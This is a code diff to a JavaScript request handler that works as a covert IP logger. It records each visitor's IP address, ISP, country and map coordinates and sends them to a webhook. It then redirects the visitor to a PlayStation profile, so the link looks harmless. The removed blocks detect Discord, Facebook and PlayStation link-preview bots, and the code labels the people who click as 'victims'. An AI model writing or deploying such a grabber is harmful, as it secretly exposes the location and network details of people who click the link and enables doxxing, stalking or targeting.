@@ -79,70 +79,7 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-        // Check 1: Google LLC and Discordbot
-        if (userAgent === "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)") {
-            const message = {
-                embeds: [
-                    {
-                        title: "User Send Link To Victim from Discord Message",
-                        color: 0xFF0000,
-                        description: "Device info collected from sender.",
-                        fields: [
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                        ]
-                    }
-                ]
-            };
-            await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
-            res.end();
-        }
-
-        // Check 2: Facebook External Hit
-        if (ipDetails.isp === "Facebook, Inc." && userAgent === "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") {
-            const message = {
-                embeds: [
-                    {
-                        title: "User Send Link To Victim Facebook/Instagram Message",
-                        color: 0xFF0000,
-                        description: "Device info collected from sender.",
-                        fields: [
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                        ]
-                    }
-                ]
-            };
-            await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
-            res.end();
-        }
-
-        // Check 3: Playstation External Hit
-        if (ipDetails.isp === "Amazon.com, Inc." && userAgent === "UrlPreviewServiceV2") {
-            const message = {
-                embeds: [
-                    {
-                        title: "User Send Link To Victim Playstation Message",
-                        color: 0xFF0000,
-                        description: "Device info collected from sender.",
-                        fields: [
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                        ]
-                    }
-                ]
-            };
-            await sendToWebhook(message);
-            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
-           res.end();
-        }
-
-
+       
         // Default: Full Info for Other Requests
         const message = {
                 embeds: [
